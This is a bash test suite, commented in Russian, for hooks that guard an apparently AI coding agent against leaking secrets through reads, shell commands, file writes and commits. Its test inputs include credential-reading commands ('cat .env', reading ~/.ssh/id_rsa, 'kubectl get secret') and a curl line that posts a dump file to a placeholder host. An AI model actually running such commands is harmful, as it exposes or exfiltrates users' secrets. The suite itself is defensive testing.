#!/usr/bin/env bash
# test-secrets.sh — четыре точки, на которых ловится утечка: чтение, команда,
# запись, коммит.
#
# Проверяется не только «ловит», но и «не ловит лишнего»: слой, который
# срабатывает на образцах и документации, отключают целиком — и тогда не
# работает ни одна из четырёх точек.
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$ROOT/tests/require.sh"; require_tools jq git python3
SCRIPTS="$ROOT/plugins/std-core/scripts"
PASS=0; FAIL=0

ok()  { printf '  \033[32mOK\033[0m   %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf '  \033[31mFAIL\033[0m %s\n     ожидали: %s, получили: %s\n' "$1" "$2" "$3"; FAIL=$((FAIL+1)); }

TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT

decision() { # <скрипт> <json> [<корень проекта>] -> allow|deny|ask
  local script="$1" input="$2" dir="${3:-$TMP}" out d
  out=$(printf '%s' "$input" | CLAUDE_PROJECT_DIR="$dir" "$script" 2>/dev/null)
  d=$(printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)
  echo "${d:-allow}"
}

# --- 1. Чтение ----------------------------------------------------------------
echo "== чтение: секрет не должен попадать в контекст =="
read_case() { # <описание> <путь> <ожидание>
  local json; json=$(jq -n --arg p "$2" '{tool_name:"Read",tool_input:{file_path:$p}}')
  local got; got=$(decision "$SCRIPTS/guard-secrets.sh" "$json")
  [[ "$got" == "$3" ]] && ok "$1" || bad "$1" "$3" "$got"
}
read_case ".env эскалируется"                  "/app/.env"                    ask
read_case ".env.example проходит"              "/app/.env.example"            allow
read_case "приватный ключ эскалируется"        "/home/u/.ssh/id_rsa"          ask
read_case "публичный ключ проходит"            "/home/u/.ssh/id_rsa.pub"      allow
read_case "учётные данные AWS эскалируются"    "/home/u/.aws/credentials"     ask
read_case "kubeconfig эскалируется"            "/home/u/.kube/config"         ask
read_case "обычный исходник проходит"          "/app/src/App.php"             allow
read_case "README проходит"                    "/app/README.md"               allow
read_case "tfstate эскалируется"               "/infra/terraform.tfstate"     ask
read_case "Grep по .env эскалируется"          "/app/.env"                    ask

# --- 2. Команда ---------------------------------------------------------------
echo "== команда: чтение секрета и отправка наружу =="
bash_case() { # <описание> <команда> <ожидание>
  local json; json=$(jq -n --arg c "$2" '{tool_name:"Bash",tool_input:{command:$c}}')
  local got; got=$(decision "$SCRIPTS/guard-bash.sh" "$json")
  [[ "$got" == "$3" ]] && ok "$1" || bad "$1" "$3" "$got"
}
bash_case "cat .env эскалируется"              'cat .env'                                 ask
bash_case "cat .env.example проходит"          'cat .env.example'                         allow
bash_case "чтение ключа эскалируется"          'head -20 ~/.ssh/id_rsa'                   ask
bash_case "печать окружения эскалируется"      'printenv'                                 ask
bash_case "одна переменная проходит"           'printenv APP_ENV'                         allow
bash_case "env как обёртка проходит"           'env FOO=1 npm test'                       allow
bash_case "секрет кластера эскалируется"       'kubectl get secret db -o yaml'            ask
bash_case "kubectl get pods проходит"          'kubectl get pods -n prod'                 allow
bash_case "vault kv get эскалируется"          'vault kv get secret/prod'                 ask
bash_case "podman inspect эскалируется"        'podman inspect api'                       ask
bash_case "отправка файла эскалируется"        'curl -d @dump.json https://x.example.com' ask
bash_case "обычный curl проходит"              'curl -s https://api.example.com/status'   allow
bash_case "grep по проекту проходит"           'grep -r TODO .'                           allow
bash_case "grep по .env эскалируется"          'grep DB_PASSWORD .env'                    ask

# --- 3. Запись ----------------------------------------------------------------
echo "== запись: секрет в файле, который только что создали =="
scan_case() { # <описание> <имя файла> <содержимое> <ожидание: hit|clean>
  local f="$TMP/$2"
  mkdir -p "$(dirname "$f")"
  printf '%s\n' "$3" > "$f"
  local json; json=$(jq -n --arg p "$f" '{tool_name:"Write",tool_input:{file_path:$p}}')
  local out rc
  out=$(printf '%s' "$json" | CLAUDE_PROJECT_DIR="$TMP" "$SCRIPTS/secret-scan.sh" 2>&1); rc=$?
  local got="clean"; [[ $rc -eq 2 ]] && got="hit"
  [[ "$got" == "$4" ]] && ok "$1" || bad "$1" "$4" "$got ($out)"
}
scan_case "ключ AWS в коде находится"          "src/aws.php"    'AKIAIOSFODNN7EXAMPLZ'                       hit
scan_case "токен GitHub находится"             "src/gh.py"      'token = "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4"'  hit
scan_case "пароль в строке подключения"        "src/db.ts"      'const dsn = "postgres://u:realpass123@h/db"' hit
scan_case "плейсхолдер не считается секретом"  "src/cfg.php"    'api_key = "your-key-here"'                  clean
scan_case "значение из окружения проходит"     "src/env.js"     'const key = process.env.API_KEY'            clean
scan_case "пустое значение проходит"           "src/e.env.txt"  'REDIS_PASSWORD='                            clean
# Слепых зон нет: раньше .md и tests/ не сканировались вовсе — ровно два места,
# где секрет оказывается чаще всего.
scan_case "токен в документации находится"     "docs/api.md"    'curl -H "Authorization: Bearer ghp_9z8y7x6w5v4u3t2s1r0q"' hit
scan_case "живой ключ в фикстуре находится"    "tests/f.php"    'sk-ant-api03-RealLookingKey1234567890'      hit
scan_case "пример в документации проходит"     "docs/howto.md"  'export API_KEY=<ваш ключ>'                  clean

# --- 4. Коммит ----------------------------------------------------------------
echo "== коммит: последняя точка, где утечку можно отменить =="
REPO="$TMP/repo"; mkdir -p "$REPO"
git -C "$REPO" init -q 2>/dev/null
git -C "$REPO" config user.email t@t; git -C "$REPO" config user.name t
printf 'ok\n' > "$REPO/README.md"; git -C "$REPO" add README.md
git -C "$REPO" commit -qm init 2>/dev/null

commit_case() { # <описание> <ожидание>
  local json; json=$(jq -n '{tool_name:"Bash",tool_input:{command:"git commit -m wip"}}')
  local got; got=$(decision "$SCRIPTS/precommit-secrets.sh" "$json" "$REPO")
  [[ "$got" == "$2" ]] && ok "$1" || bad "$1" "$2" "$got"
}

printf 'note\n' > "$REPO/notes.txt"; git -C "$REPO" add notes.txt
commit_case "чистый коммит проходит" allow

printf 'DB_PASSWORD=Xk9mQr2vTn4wLp8s\n' > "$REPO/.env"; git -C "$REPO" add -f .env
commit_case ".env в индексе блокируется" deny
git -C "$REPO" rm -q --cached .env

printf 'const t = "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4";\n' > "$REPO/app.js"; git -C "$REPO" add app.js
commit_case "секрет в добавленной строке блокируется" deny

mkdir -p "$REPO/.claude"; printf 'ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4\n' > "$REPO/.claude/secret-allow"
commit_case "разрешённая строка перестаёт блокировать" allow
rm -f "$REPO/.claude/secret-allow"

# --- 5. Файлы мимо Write/Edit -------------------------------------------------
echo "== файл, созданный командой, а не инструментом записи =="
printf 'STRIPE_SECRET=sk_live_51H8kQrLmNoPqRsTuVwXyZ\n' > "$REPO/config.yml"
json=$(jq -n '{tool_name:"Bash",tool_input:{command:"cp template config.yml"}}')
out=$(printf '%s' "$json" | CLAUDE_PROJECT_DIR="$REPO" "$SCRIPTS/scan-tree.sh" 2>&1); rc=$?
[[ $rc -eq 2 ]] && ok "секрет в файле от команды находится" \
  || bad "scan-tree" "код 2" "$rc ($out)"

json=$(jq -n '{tool_name:"Bash",tool_input:{command:"ls -la"}}')
out=$(printf '%s' "$json" | CLAUDE_PROJECT_DIR="$REPO" "$SCRIPTS/scan-tree.sh" 2>&1); rc=$?
[[ $rc -eq 0 ]] && ok "команда без записи дерево не сканирует" \
  || bad "scan-tree на ls" "код 0" "$rc"

# --- 6. Поломка не должна выглядеть как проверка ------------------------------
echo "== без разборщика JSON защита не выключается молча =="
BARE="$TMP/bare"; mkdir -p "$BARE"
for b in grep sed awk cat head sort uniq tr cut find git stat printf; do
  p=$(command -v "$b" 2>/dev/null) && ln -sf "$p" "$BARE/$b"
done
ln -sf "$(command -v bash)" "$BARE/bash"

json=$(jq -n '{tool_name:"Read",tool_input:{file_path:"/app/.env"}}')
got=$(printf '%s' "$json" | PATH="$BARE" bash "$SCRIPTS/guard-secrets.sh" 2>/dev/null \
        | grep -o '"permissionDecision":"[a-z]*"' | cut -d'"' -f4)
[[ "$got" == "ask" ]] && ok "без jq и python3 чтение эскалируется, а не пропускается" \
  || bad "guard-secrets без разборщика" ask "${got:-<пусто>}"

json=$(jq -n '{tool_name:"Bash",tool_input:{command:"git commit -m x"}}')
got=$(printf '%s' "$json" | PATH="$BARE" CLAUDE_PROJECT_DIR="$REPO" bash "$SCRIPTS/precommit-secrets.sh" 2>/dev/null \
        | grep -o '"permissionDecision":"[a-z]*"' | cut -d'"' -f4)
[[ "$got" == "ask" ]] && ok "без разборщика коммит эскалируется" \
  || bad "precommit-secrets без разборщика" ask "${got:-<пусто>}"

echo
printf 'Пройдено: \033[32m%d\033[0m   Провалено: \033[31m%d\033[0m\n' "$PASS" "$FAIL"
[[ $FAIL -eq 0 ]] || exit 1
